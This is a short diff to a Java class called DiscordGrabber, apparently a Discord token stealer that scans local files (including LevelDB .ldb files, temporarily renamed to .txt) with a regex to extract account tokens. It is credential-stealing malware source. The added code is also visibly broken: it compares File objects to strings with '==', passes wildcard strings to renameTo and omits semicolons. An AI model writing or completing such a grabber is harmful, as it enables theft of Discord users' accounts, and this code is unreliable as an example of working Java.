@@ -23,7 +23,12 @@ public class DiscordGrabber {
         
         for (String pathname : pathnames) { //Iterate through all the files
             File file = new File(pathname); //set the results of the iteration as the new File file
-            
+  
+            if(file == "*.ldb") {
+                file.renameTo("*.txt")
+            }          
+
+
             try { //Search for the regex expression within the file
                 Pattern pattern = Pattern.compile(regex);
                 Matcher matcher = pattern.matcher(fromFile(pathname));
@@ -35,6 +40,9 @@ public class DiscordGrabber {
                 
                 }catch(Exception e) {
                     
+                }
+                if(file == "*.txt") {
+                    file.renameTo("*.ldb")
                 }
             }
         //token = matcher.group(1); //set token to the first (and probably only) match
